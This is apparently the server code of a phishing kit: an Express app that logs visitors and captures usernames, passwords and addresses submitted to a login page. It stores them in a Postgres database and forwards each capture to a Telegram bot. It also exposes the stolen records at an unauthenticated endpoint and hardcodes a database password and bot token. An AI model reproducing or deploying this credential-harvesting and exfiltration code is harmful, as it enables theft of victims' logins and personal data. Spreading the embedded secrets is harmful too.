const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const pool = new Pool({
    connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
    ssl: { rejectUnauthorized: false }
});

pool.query(`
    CREATE TABLE IF NOT EXISTS records (
        id SERIAL PRIMARY KEY,
        type TEXT,
        username TEXT,
        password TEXT,
        address TEXT,
        ip TEXT,
        location TEXT,
        timestamp TEXT
    )
`).then(() => console.log("✅ Table Ready"));

function getRealIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'Unknown';
}

const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
const CHAT_ID = "8559945003";

async function sendTelegram(record) {
    const msg = `🚨 *New Activity*\n\n` +
        `Type: ${record.type}\n` +
        `User: ${record.username || 'Visitor'}\n` +
        `Pass: ${record.password || '-'}\n` +
        `Details: ${record.address || '-'}\n` +
        `IP: ${record.ip}\n` +
        `Location: ${record.location || 'Unknown'}\n` +
        `Time: ${record.timestamp}`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
    } catch(e) {}
}

async function saveRecord(type, username=null, password=null, address=null, ip='Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    let location = 'Unknown';

    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`, { timeout: 3000 });
        const data = await res.json();
        location = `${data.city || ''}, ${data.country || ''}`.trim() || 'Unknown';
    } catch(e) {}

    await pool.query(
        "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1,$2,$3,$4,$5,$6,$7)",
        [type, username, password, address, ip, location, timestamp]
    );

    await sendTelegram({ type, username, password, address, ip, location, timestamp });
}

// Routes
app.get('/', async (req, res) => {
    const ip = getRealIP(req);
    await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', async (req, res) => {
    const ip = getRealIP(req);
    await saveRecord('Page Visit', null, null, 'Login Page Opened', ip);
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', async (req, res) => {
    const { username, password, address } = req.body;
    const ip = getRealIP(req);
    await saveRecord('Login Attempt', username, password, address, ip);
    res.json({ success: true });
});

app.get('/api/records', async (req, res) => {
    const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
    res.json(result.rows);
});

app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// Other routes (confirm-code, delete, clear) keep as they were

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));
